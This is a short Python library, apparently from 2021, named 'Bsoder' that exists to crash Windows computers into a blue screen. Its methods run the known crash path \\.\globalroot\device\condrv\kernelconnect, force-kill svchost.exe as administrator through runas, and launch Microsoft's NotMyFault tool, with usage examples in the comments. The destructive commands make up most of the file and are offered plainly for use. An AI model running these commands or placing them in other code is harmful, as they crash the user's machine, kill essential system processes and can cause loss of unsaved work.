"""

This lib is very simple and first goal of this lib is not create lib for lib.
is just will save 10-15 minutes in doing simple project. off cource you can spend time odd google it and create your implementation ,
 but just use lib.

 Author : Alex Zaslavskis
 2021

 Licence is GPL 2.0

 """



import os

class Bsoder:
	"""
	Perpares lib to work .
	You call it from your code like
		bsod=bsoder.Bsoder()
	"""

	def __init__(self):
		print("this lib will reboot your pc man times")
	

	"""
		Call`s simple bsod using simle cmd command that is called by os module in python
		For fact ths command is working on broswer : \\.\globalroot\device\condrv\kernelconnect
		You can call it using :
			bsod.simplest__bsod()
	"""
	def simplest__bsod(self):
		os.system("\\.\globalroot\device\condrv\kernelconnect")
	

	"""
		Call`s simple bsod using simple cmd command that is called by os module in python
		For fact ths command is on powershell : runas /user:administrator TASKKILL /IM svchost.exe /F
		Also runas is just for as admin rights.
		You can call it using :
			bsod.taskmanger_way()
	"""

	def taskmanger_way(self):
		os.chdir("C:\Windows\System32")
		os.system("runas /user:administrator TASKKILL /IM svchost.exe /F")
	
	"""
		Runs simple tool by Microsoft and let you manualy run bsod.
		You can run it as :
		bsod.use_external()
	"""
	def use_external(self):
		os.system("notmyfault.exe")
	


"""
Docs are here : https://alex5250.github.io/bsoder/
Simple example of code:
	import bsoder as bsoder # imports lib

	bsod=bsoder.Bsoder() # inits lib

	bsod.simplest__bsod()# calls bsod

"""
